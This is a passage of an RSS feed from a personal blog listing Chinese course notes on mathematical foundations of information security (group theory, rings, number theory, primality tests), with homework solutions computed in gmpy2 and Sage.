如果 G=&amp;lt;a&amp;gt; 是一个循环群，且 $$|G| = n$$，则当且仅当 $$gcd(k, n) = 1$$ 时，$$a^k$$ 是 G 的生成元。 推论：n 阶循环群共有 $$\phi(n)$$ 个生成元。 定理：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/12.%E7%BD%AE%E6%8D%A2%E7%BE%A4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/12.%E7%BD%AE%E6%8D%A2%E7%BE%A4/</guid><description>置换群 # 定义与概念 # 定义（置换）：
给定非空集合 X，将任意一个双射 $$\alpha: X \rightarrow X$$ 称作集合 X 的一个置换。 定义（对称群）：
如果把函数的复合 $$\circ$$ 看作一种置换间的二元运算，可以证明 X 的所有置换所组成的集合 $$S_X$$ 与这个二元运算 $$\circ$$ 组成的代数系统构成一个群。我们将上述的群 $$(S_X, \circ)$$ 称为集合 X 上的对称群 (Symmetric Group)。
当 $$X = {1, 2, \cdots, n}$$ 时，称 $$S_X$$ 为 n 次对称群，记作 $$S_n$$。可以用如下的记号来表示 $$S_n$$ 中的置换 $$\alpha$$：
$$\alpha = \begin{pmatrix}1 &amp;amp; 2 &amp;amp; \cdots &amp;amp; n \ \alpha(1) &amp;amp; \alpha(2) &amp;amp; \cdots &amp;amp; \alpha(n) \end{pmatrix}$$。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/13.%E9%99%AA%E9%9B%86%E4%B8%8E%E5%95%86%E7%BE%A4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/13.%E9%99%AA%E9%9B%86%E4%B8%8E%E5%95%86%E7%BE%A4/</guid><description>陪集与商群 # 陪集 # 定义（左陪集）：
$$(G, \cdot)$$ 为群，$$H \le G, a\in G$$，我们用符号aH 来表示如下 G 的子集：$$aH = {ah | h \in H}$$。并且称这样的子集为子群 H 的左陪集。 定义（左陪集关系）：
设群 $$(H, \cdot)$$ 为群 $$(G, \cdot)$$ 的子群，我们确定 G 上的一个关系：$$a, b \in G, a \equiv b \Leftrightarrow a^{-1} \cdot b \in H$$，这个关系称作 G 上关于 H 的左陪集关系。 定理：
设群 $$(H, \cdot)$$ 为群 $$(G, \cdot)$$ 的子群，则 G 上关于 H 的左陪集关系是一个等价关系。 定义（等价类）：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/14.%E5%90%8C%E6%80%81%E4%B8%8E%E5%90%8C%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/14.%E5%90%8C%E6%80%81%E4%B8%8E%E5%90%8C%E6%9E%84/</guid><description>同态和同构 # 同态与同构 # 定义（同态）：
$$(X, \cdot)$$ 与 $$(Y, *)$$ 是两个群，如果存在映射 $$x \rightarrow y$$，使得 $$\forall x_1, x_2 \in X$$，都有 $$f(x_1 \cdot x_2) = f(x_1) * f(x_2) $$， 则称 f 是从 $$(X, \cdot)$$ 到 $$(Y, *)$$ 的同态映射或称群 $$(X, \cdot)$$ 与群 $$(Y, *)$$ 同态，记作 $$(X, \cdot) \sim (Y, *)$$ 或 $$X \sim Y$$ 一个群到自身的同态叫做自同态； 定义（同构）：
若同态映射 f 是单射，则称此同态为单同态； 若同态映射 f 是满射，则称此同态为满同态； 若同态映射 f 是双射，则称此同态为同构，记作 $$(X, \cdot) \cong (Y, *)$$，或者 $$X \cong Y$$； 一个群到自身的同构叫做自同构 定义（核与像）：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/15.%E4%BA%A4%E6%8D%A2%E7%8E%AF%E5%92%8C%E5%9F%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/15.%E4%BA%A4%E6%8D%A2%E7%8E%AF%E5%92%8C%E5%9F%9F/</guid><description>交换环和域 # 交换环 # 定义（环）：
设 R 是一个给定的集合，在其上定义了两种运算 $$+, \cdot$$，如果满足以下条件，则 $$(R, +, \cdot)$$ 构成一个环： $$(R, +)$$ 是一个交换群，其上的单位元被零元，元素在 + 上的逆元被称为负元； $$(R, \cdot)$$ 是一个半群，其上的单位元被称为幺元。 + 关于 $$\cdot$$ 满足分配率，即 $$a \cdot (b + c) = a \cdot b + a \cdot c$$。 如果 $$(R, \cdot)$$ 满足交换率，则该环被称为交换环。 定义（子环）：
如果交换环 R 的一个一个子集 S 满足如下的三个条件，则称 S 是 R 的子环： $$I \in S$$ 如果 $$a, b \in S$$，则 $$a - b \in S$$ 如果 $$a, b \in S$$，则 $$ab \in S$$ 整环 # 定义（零因子）：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/16.%E4%B8%80%E5%85%83%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%8E%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/16.%E4%B8%80%E5%85%83%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%8E%AF/</guid><description>一元多项式环 # 概念与性质 # 定义（一些定义）：
设 $$(R, +, \cdot)$$ 是交换环，x 是一个变元，n 是非负整数，$$a_0, a_1, \cdots, a_n \in R$$，则 $$f(x) = a_0 + a_1 x + \cdots + a_n x^n$$ 称为交换环 R 上的一元多项式。
其中 $$a_0, a_1, \cdots, a_n$$ 称为该多项式的系数，$$a_0$$ 称为常数项。
如果 $$a_n \not= 0$$，那么称 $$a_n$$ 为首项系数，n 称为一元多项式 f(x) 的次数，记做 $$\deg f(x) = n$$
所有交换环上的一元多项式组成的集合记做 R。
定理：
设 $$(R, +, \cdot)$$ 是交换环，f(x) 和 g(x) 是 R中的两个非零多项式，则： $$f \times g = \text{零多项式}$$ 或者 $$\deg f \times g \le \deg f + \deg g$$ 如果 $$(R, +, \cdot)$$ 是整环，那么 $$f \times g \not= \text{零多项式}$$ 且 $$\deg f \times g \le \deg f + \deg g$$ 定义（一元多项式环）：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/17.%E7%90%86%E6%83%B3%E5%92%8C%E5%95%86%E7%8E%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/17.%E7%90%86%E6%83%B3%E5%92%8C%E5%95%86%E7%8E%AF/</guid><description>理想和商环 # 理想 # 定义（理想）：
设 $$(R, +, \cdot)$$ 是一个交换环，I 是 R 的子集，使得： $$0 \in I$$； $$\forall a, b \in I \Rightarrow a+b \in I$$； $$\forall a \in I, r \in R \Rightarrow ra \in I$$； 则将 I 称为 R 的理想，显然 R 的两个平凡子环都是 R 的理想，称为 R 的平凡理想。非平凡理想称为真理想。 定理：
设 f 是交换环 S 到交换环 G 的同态映射，则 im f 是 G 的子环，ker f 是 S 的理想。 定义（主理想）：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/18.%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/18.%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/</guid><description>椭圆曲线 # 仿射平面与射影平面 # 定义（仿射平面）：
域 K 上的集合 $$K^2 = {(x, y) | x, y \in K}$$ 称为域 K 上的仿射平面，$$K^2$$ 上的元素称为仿射平面上的点，可以用仿射坐标 (x, y) 表示。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/19.%E5%9F%9F%E4%B8%8A%E7%9A%84%E4%B8%80%E5%85%83%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%8E%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/19.%E5%9F%9F%E4%B8%8A%E7%9A%84%E4%B8%80%E5%85%83%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%8E%AF/</guid><description>域上的一元多项式环 # 一元多项式的整除 # 定义：
如果 $$f(x), g(x) \in K$$ 不全为零多项式，且 $$d(x) \in K, d(x) \not= 0$$。 若 $$d(x) | f(x)$$ 且 $$d(x) | g(x)$$，则称 d(x) 为 g(x) 与 f(x) 的</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/2.%E6%95%B4%E9%99%A4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/2.%E6%95%B4%E9%99%A4/</guid><description>整除 # 概念和性质 # 定义（整除）：
设 $$a, b \in \mathbb{Z}, b \neq 0.$$ 如果 $$\exist q \in \mathbb{Z}, s.t. a = qb.$$ 那么就称 b 整除 a，或 a 被 b 整除，记作 $$b | a.$$ 完全数、梅森素数和费马素数 # Basic # 费尔马素数和梅森素数的研究都基于这样一个重要的因式分解：
$$\displaystyle 2^{st} - 1 = (2^s - 1)(\sum_{i=1}^{t} 2^{s(t-i)})$$
若 t 为奇数：$$\displaystyle 2^{st} + 1 = (2^s + 1)(\sum_{i = 1}^{t}(-1)^{i+1} 2^{s(t-i)})$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/3.%E5%90%8C%E4%BD%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/3.%E5%90%8C%E4%BD%99/</guid><description>同余 # 概念和性质 # 定义（同余）：
给定一个正整数 m，如果用 m 去除两个整数 a 和 b 所得到的余数相同，则称 a 和 b 模 m 同余：$$a \equiv b \pmod{m}$$。否则，称 a 和 b 模 m 不同余，记作 $$a \not\equiv b \pmod{m} $$ 定理：
整数 a 和整数 b 模 m 同余 $$\Leftrightarrow m | (a - b)​$$ 定理：
设 $$a_1, a_2, b_1, b_2 \in \mathbb{Z}$$，如果有：$$a_1 \equiv b_1 \pmod{m}, a_2 \equiv b_2 \pmod{m}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/4.%E6%AC%A1%E6%95%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/4.%E6%AC%A1%E6%95%B0/</guid><description>次数 # 概念与性质 # 定义（次数）：
设 m 是大于 1 的整数，a 是与 m 互素的整数，使 $$a^l \equiv 1 \pmod{m}$$ 成立的最小正整数 l 叫做 a 对模 m 的次数。记作 $$ord_m(a)$$ 或 $$\sigma(a)$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/5.%E5%8E%9F%E6%A0%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/5.%E5%8E%9F%E6%A0%B9/</guid><description>原根 # 概念与性质 # 定义（原根）：
设 m 是大于 1 的整数，a 是与 m 互素的整数，若 $$ord_m(a) = \phi(m)$$，则 a 叫做 m 的原根。 定理：
a 是 m 的原根的充要条件是 $$1, a, a^2, &amp;hellip;, a^{\phi(m)-1}$$ 是模 m 的一个缩系。 定理：
设 a 是 m 的一个原根，t 是非负整数，则 $$a^t$$ 也是 m 的原根的充要条件是 $$gcd(t, \phi(m)) = 1$$
若 a 是 m 的原根，则 m 恰有 $$\phi(\phi(m))$$ 个模 m 不同余的原根。
定理：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/6.%E6%8C%87%E6%95%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/6.%E6%8C%87%E6%95%B0/</guid><description>指数 # 概念与性质 # 定义（指数）：
设 m 是大于 1 的整数，g 是 m 的一个原根，a 是与 m 互素的整数，则存在唯一的非负整数 r，$$0 \le r \lt \phi(m)$$，满足 $$g^r \equiv a \pmod{m}$$。于是，我们把 r 叫做以 g 为底 a 对模 m 的指数，记作 $$ind_g a$$。
显然根据定义，我们有 $$a \equiv g^{ind_g a} \pmod{m}$$。有时，也把指数称作离散对数。
定理：
g 是 m 的一个原根，a 是与 m 互素的整数，如果非负整数 k 使得同余式 $$g^k \equiv a \pmod{m}$$ 成立，则有 k 满足：$$k \equiv ind_g a \pmod{\phi(m)}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/7.%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/7.%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99/</guid><description>二次剩余 # 高次剩余 # 定义：
高次剩余：设 m 是大于 1 的整数，a 是与 m 互素的整数，若 $$n (n \ge 2)$$ 次同余方程 $$x^n \equiv a \pmod{m}$$ 有解，则 a 叫做模 m 的 n 次剩余。否则，a 叫做模 m 的 n 次非剩余。 定理：
g 是 m 的一个原根，a 是与 m 互素的整数。 则同余方程 $$x^n \equiv a \pmod{m}$$ 有解的充要条件是 $$gcd(n, \phi(m)) | ind_g a$$，并且如果有解，其解的个数恰好为 $$gcd(n, \phi(m))$$ 定理：
g 是 m 的一个原根，a 是与 m 互素的整数。 则 a 是模 m 的 n 次剩余的充要条件是 $$\displaystyle a^{\frac{\phi(m)}{d}} \equiv 1 \pmod{m}, d = gcd(n, \phi(m))$$ 二次剩余 # 定义：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/8.%E6%95%B0%E8%AE%BA%E5%BA%94%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/8.%E6%95%B0%E8%AE%BA%E5%BA%94%E7%94%A8/</guid><description>数论的应用 # 素性检验算法 # 确定性素性检验 # Lucas 素性检验：
如果存在整数 a，使得 $$a^{n-1} \equiv 1 \pmod{n}$$，并且对 n-1 的任意素因子 p，$$a^{\frac{n-1}{p}} \not\equiv 1 \pmod{n}$$ 成立，那么 n 是素数。 Lehmer 素性检验：
如果对 n-1 的任意素因子 $$p_i$$，都存在一个整数 $$a_i$$，使得 $$a_i^{n-1} \equiv 1 \pmod{n}$$ 与 $$a_i^{n-1} \not\equiv 1 \pmod{n}$$ 成立，那么 n 是素数。 Pocklington 素性检验：
对 n-1 做不完全因子分解，得到 $$n-1 =mj$$，其中有标准分解式 $$m =p_1^{k_1}&amp;hellip;p_r^{k_r}, m \ge \sqrt{n}, gcd(m, j) = 1$$。如果对于每个 $$p_i (1 \le i \le r)$$，都存在一个整数 $$a_i$$，使得 $$a_i^{n-1} \equiv 1 \pmod{n}, gcd(a_i^{\frac{n-1}{p_i} - 1}, n) = 1$$，那么 n 是素数。 随机性素性检验 # 引理：$$\displaystyle x^2 \equiv 1 \bmod{p} \Leftrightarrow x = \begin{cases} 1 &amp;amp; \bmod{p} \ -1 &amp;amp; \bmod{p}\end{cases}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/9.%E7%BE%A4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/9.%E7%BE%A4/</guid><description>群 # 概念和性质 # 定义（群的阶）：
群 $$(G, *)$$ 的元素个数 |G| 被称为群的阶，如果 |G| 有限，则称 G 为有限群。 定义（元素的阶）：
在群 G 中，对于元素 a 来说，使得 $$a^n = 1$$ 的最小正整数 n 称为元素 a 的阶，记作 ord(a)。如果不存在这样的正整数，那么我们称 a 为无限阶元素。 定理：
群 G 中元素 a 的阶为 k，如果 $$a^n = 1$$，那么 k|n</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/2.1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/2.1/</guid><description>2.1 # 解答题 # 1 # &amp;gt;&amp;gt;&amp;gt; import gmpy2 &amp;gt;&amp;gt;&amp;gt; print(gmpy2.gcd(55, 85), gmpy2.gcd(202, 282), gmpy2.gcd(666, 1414), gmpy2.gcd(20785, 44350)) 5 2 2 5 手算可以用辗转相除法。比如：
55, 85 ==&amp;gt; 55, 30 ==&amp;gt; 25, 30 ==&amp;gt; 25, 5 ==&amp;gt; 5|25 2 # &amp;gt;&amp;gt;&amp;gt; import gmpy2 &amp;gt;&amp;gt;&amp;gt; print(gmpy2.lcm(231, 732), gmpy2.lcm(-871, 728)) 56364 48776 # 单个输出时可能见到 mpz 的符号 # mpz 是 GNU 项目用于处理大整数的 C++ 库 手算可以用短除法。比如：
初始化: a=231, b=732, Set={}
gcd(231, 732)=3 ==&amp;gt; Set={3}
gcd(77, 244)=1 ==&amp;gt; Set={3, 77, 244} 另外最小公倍数必须是正整数（不然可以无穷小）。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/2.2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/2.2/</guid><description>2.2 # 解答题 # 1 # 关于欧拉函数，对于 10：$$\phi(10) = 4$$
因此我们知道 $$7^4 \equiv 1 \pmod{10}$$，而 $$2046 \equiv 2 \pmod{4}$$
因此，我们有：$$7^{2046} \equiv 7^2 \equiv 9 \pmod{10}​$$
2 # 对于 100 有：$$100 = 4*25$$，并且有 $$\phi(25) = 20$$
因此首先有 $$2^{100} \equiv 0 \pmod{4}$$，然后有 $$2^{100} = (2^{5})^{20} \equiv 1 \pmod{25}$$
而存在这样的数 76：$$2^{100} \equiv 76 \pmod{4}, 2^{100} \equiv 76 \pmod{25}$$
因此 $$2^{100} \equiv 76 \pmod{100}$$
3 # 考虑到 $$\displaystyle (x+4)^5 \overset{二项式展开}{\equiv} x^5 \pmod{4}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/3.1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/3.1/</guid><description>3.1 # 解答题 # 1 # #!/usr/bin/env python2 from sage.all import * R = IntegerModRing(37) # 建立一个模 37 的整数环 p = R(34) # 取整数环上的数 34 print(p.multiplicative_order()) # 求次数（http://mathonline.wikidot.com/the-order-of-a-permutation） 9 即，我们有 $$34^{9} \equiv 1 \pmod{37}$$
手算可以先计算 37 的欧拉函数：$$\phi(37) = 36$$
根据欧拉定理，与次数的性质，34 对模 37 的次数一定是 36 的因子，穷举可得 9。
2 # #!/usr/bin/env python2 from sage.all import * R = IntegerModRing(37) p = R(2**12) print(p.multiplicative_order()) # 3 即，我们有 $$\displaystyle 2^{12*3} \equiv 1 \pmod{37}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/3.2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/3.2/</guid><description>3.2 # 解答题 # 1 # 直接通过 sage 计算：
#!/usr/bin/env sage print(kronecker(2, 29)) # -1 另外，可以具体过程为：
对于勒让德符号 $$\displaystyle (\frac{a}{p}) = (\frac{2}{29})$$，根据欧拉判别条件 $$\displaystyle (\frac{2}{29}) = 2^{\frac{28}{2}} \equiv 32^2 * 16 \equiv 9 * 16 \equiv 144 \equiv -1 \pmod{29}$$
或者 $$p \equiv -3 \pmod{8}$$，因此 $$\displaystyle (\frac{2}{29}) = -1$$
所以 2 不为 29 的二次剩余。
2 # -1 是模 p 的二次剩余 $$\displaystyle \Leftrightarrow (\frac{-1}{p}) = 1​$$
对于左侧勒让德符号 $$\displaystyle (\frac{-1}{p}) = (-1)^{\frac{p-1}{2}} = \begin{cases} 1 &amp;amp; \text{若 } p \equiv 1 \pmod{4} \ -1 &amp;amp; \text{若 } p \equiv 3\pmod{4}\end{cases}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/4.1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/4.1/</guid><description>4.1 群 # 证明题 # 1 # （1）
这个运算是交换的：
$$n * m = -m - n = -n -m = n*m$$ 但是这个运算不是结合的
